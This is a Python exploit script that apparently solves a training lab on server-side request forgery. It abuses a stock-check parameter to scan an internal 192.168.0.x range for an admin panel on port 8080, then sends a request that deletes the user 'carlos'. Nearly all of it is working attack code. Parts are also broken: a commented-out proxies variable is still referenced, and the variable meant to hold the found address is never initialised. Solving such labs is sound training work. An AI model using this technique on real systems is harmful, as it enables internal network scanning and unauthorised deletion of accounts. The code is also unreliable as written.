'''

Lab #2 - Basic SSRF against another back-end system

Vulnerable feature - stock check functionality

Goal -  use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos. 

Analysis:

application running on: http://192.168.0.190:8080/admin

delete carlos: http://192.168.0.190:8080/admin/delete?username=carlos

python3 script.py <url>

192.168.0.255

'''


import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def check_admin_hostname(url):
    stock_path = 'product/stock'
    
    for i in range(0, 256):
        hostname = 'http://192.168.0.%s:8080/admin' %i
        params = {'stockApi': hostname}
        res = requests.post(url+stock_path, verify=False, data=params, proxies=proxies)

        if res.status_code == 200:
            admin_ip_address = '192.168.0.%s' %i
            break

    if admin_ip_address == '':
        print("(-) Could not find admin hostname.")
        sys.exit(-1)
    return admin_ip_address

def delete_user(url, admin_ip_address):
    stock_path = 'product/stock'
    ssrf_payload = 'http://%s:8080/admin/delete?username=carlos' % admin_ip_address
    params = {'stockApi': ssrf_payload}
    #res = requests.post(url+stock_path, data=params, verify=False, proxies=proxies)
    res = requests.post(url+stock_path, data=params, verify=False)

    # Check if the user was deleted successfully

    check_path = 'http://%s:8080/admin' % admin_ip_address
    params = {'stockApi': check_path}
    res = requests.post(url+stock_path, data=params, verify=False, proxies=proxies)

    if 'User deleted successfully' in res.text:
        print("(+) Successfully deleted Carlos user!")
    else:
        print("(-) Exploit was unsuccessful.")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Finding admin hostname...")
    admin_ip_address = check_admin_hostname(url)
    print ("(+) Found the admin ip address: %s" % admin_ip_address)
    print("(+) Deleting user...")

    delete_user(url, admin_ip_address)

if __name__ == '__main__':
    main()
